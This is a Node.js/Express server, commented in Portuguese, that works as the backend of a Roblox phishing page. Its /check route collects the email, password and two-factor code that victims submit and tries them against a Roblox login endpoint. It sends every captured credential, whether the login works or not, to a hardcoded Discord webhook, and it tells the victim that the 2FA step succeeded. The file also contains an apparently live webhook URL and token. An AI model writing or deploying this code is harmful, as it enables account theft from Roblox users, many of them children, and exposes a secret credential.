const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;

// SEU WEBHOOK DO DISCORD
const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";

// Configurações
app.use(express.json());
app.use(express.static('.')); // Sirve os ficheiros da raiz (index.html)

// Função para fazer login no Roblox
async function loginRoblox(email, password) {
    const apiUrl = "https://www.roblox.com/users/login";
    
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Roblox/WinInet',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                username: email,
                password: password
            }),
            timeout: 10000 // 10 segundos de timeout
        });

        const data = await response.json();
        
        // O Roblox retorna { id: 123, username: "User" } se estiver correto
        // Se estiver errado, retorna { error: "User not found" } ou similar
        
        return { 
            success: response.ok && data.id, 
            data: data, 
            error: data.error || null,
            statusCode: response.status
        };
    } catch (error) {
        return { success: false, data: null, error: error.message, statusCode: 0 };
    }
}

// Função para enviar ao Discord
async function sendToDiscord(message) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Erro ao enviar para o Discord:", error);
    }
}

// Rota para o check
app.post('/check', async (req, res) => {
    const { email, password, code2fa, isFinalStep } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, error: "Missing email or password" });
    }

    // Se for o passo final (2FA), envia direto para o Discord e diz que está tudo bem
    if (isFinalStep) {
        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Code 2FA:** ${code2fa}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        
        await sendToDiscord(discordMessage);
        return res.json({ success: true });
    }

    // Tenta o login
    const result = await loginRoblox(email, password);

    let username = "Unknown";
    let userId = "Unknown";
    let isValid = false;
    let errorMsg = "Conexão lenta, tentando novamente...";

    // Verifica se o login foi realmente bem-sucedido
    if (result.success) {
        username = result.data.username || "Unknown";
        userId = result.data.id || "Unknown";
        isValid = true;
        errorMsg = "";
        
        // Envia ao Discord que achou a conta
        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Username:** ${username}\n` +
                               `**User ID:** ${userId}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);

    } else {
        // Se falhou, pega no erro específico do Roblox
        errorMsg = result.error || "Erro desconhecido";
        
        // Envia ao Discord que falhou (opcional, mas útil para depuração)
        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
                               `**Email:** ${email}\n` +
                               `**Password:** ${password}\n` +
                               `**Erro:** ${errorMsg}\n` +
                               `**Timestamp:** ${new Date().toISOString()}`;
        await sendToDiscord(discordMessage);
    }

    // Retorna ao frontend
    // Só diz sucesso se o login realmente funcionou (tem ID e Username)
    res.json({
        success: isValid, // Só true se tiver ID e Username
        username: username,
        userId: userId,
        error: errorMsg
    });
});

// Inicia o servidor
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
